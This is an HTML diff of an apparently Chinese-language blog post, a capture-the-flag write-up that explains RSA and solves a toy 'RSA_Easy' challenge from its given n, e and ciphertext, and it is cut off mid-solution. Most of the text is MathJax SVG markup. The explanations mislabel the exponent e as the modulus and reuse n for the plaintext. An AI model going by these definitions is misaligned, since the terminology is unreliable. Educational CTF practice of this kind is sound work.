354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(8595.6,0)"><path data-c="1D711" d="M92 210Q92 176 106 149T142 108T185 85T220 72L235 70L237 71L250 112Q268 170 283 211T322 299T370 375T429 423T502 442Q547 442 582 410T618 302Q618 224 575 152T457 35T299 -10Q273 -10 273 -12L266 -48Q260 -83 252 -125T241 -179Q236 -203 215 -212Q204 -218 190 -218Q159 -215 159 -185Q159 -175 214 -2L209 0Q204 2 195 5T173 14T147 28T120 46T94 71T71 103T56 142T50 190Q50 238 76 311T149 431H162Q183 431 183 423Q183 417 175 409Q134 361 114 300T92 210ZM574 278Q574 320 550 344T486 369Q437 369 394 329T323 218Q309 184 295 109L286 64Q304 62 306 62Q423 62 498 131T574 278Z"></path></g><g data-mml-node="mo" transform="translate(9249.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(9638.6,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(10098.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10765.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(11821.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(12210.1,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(12935.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(13935.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(14435.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(14824.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(15213.6,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(15895.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(16896,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(17396,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
+<li>選擇一個小於r的整數e，使e跟r互質，並求得e關於r的模反元素，設為d<br>(求d -&gt; <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="13.985ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6181.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(466,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(1263.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z"></path></g><g data-mml-node="mn" transform="translate(2319.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2819.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3208.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4086.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4571.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mtext" transform="translate(5091.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(5341.6,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5792.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>)</li>
+</ol>
+<ul>
+<li>RSA加密:<br>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="13.635ex" height="1.827ex" role="img" focusable="false" viewBox="0 -725.5 6026.7 807.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(710.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(1766.6,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,413) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g><g data-mml-node="mtext" transform="translate(2755.7,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(3005.7,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3883.7,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4368.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mtext" transform="translate(4888.7,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(5138.7,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g></svg></mjx-container><br>  c為加密後的結果，n為明文(加密前)，e為模數，N為p*q</li>
+<li>RSA解密:<br>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="13.774ex" height="2.23ex" role="img" focusable="false" viewBox="0 -903.7 6088.3 985.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(877.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(1933.6,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(466,413) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mtext" transform="translate(2817.3,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(3067.3,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3945.3,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4430.3,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mtext" transform="translate(4950.3,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(5200.3,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g></svg></mjx-container><br>  n為解密後的結果，c為密文(加密後)，d為e跟r((p-1) * (q-1))的模反元素，e為模數，N為p*q</li>
+</ul>
+</li>
+</ul>
+<h3 id="RSA-Easy"><a href="#RSA-Easy" class="headerlink" title="RSA_Easy"></a>RSA_Easy</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">這題題目我出爛了，所以可以直接用網站解哭了</span><br><span class="line">但還是希望了解一下啥是RSA拉哈哈</span><br></pre></td></tr></table></figure></div>
+<p>下載來後看一下程式碼:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">n = <span class="number">7906961983747432626460011685427449111190647169309825535629493220735583689550836202522449</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"n = <span class="subst">{n}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"e = <span class="subst">{e}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"c = <span class="subst">{c}</span>"</span>)</span><br></pre></td></tr></table></figure></div>
+<p>這個程式的output:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = 7906961983747432626460011685427449111190647169309825535629493220735583689550836202522449</span><br><span class="line">e = 65537</span><br><span class="line">c = 5061370730349429183719986779984362765739704575987547712894308499558345406620474823416518</span><br></pre></td></tr></table></figure></div>
+<p>因為我們沒有程式碼中的secret檔案，所以不能執行程式碼，需要透過output推測出flag是啥</p>
+<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>直接丟網站解<br><a class="link" target="_blank" rel="noopener" href="https://www.dcode.fr/rsa-cipher">https://www.dcode.fr/rsa-cipher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1Lc_kWeR.png" alt="image"></p>
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>根據最前面的RSA介紹，得知這題的flag被rsa加密(程式碼第8行)<br>c = pow(flag, e, n)<br>對應<br><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="13.635ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 6026.7 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(710.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(1766.6,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 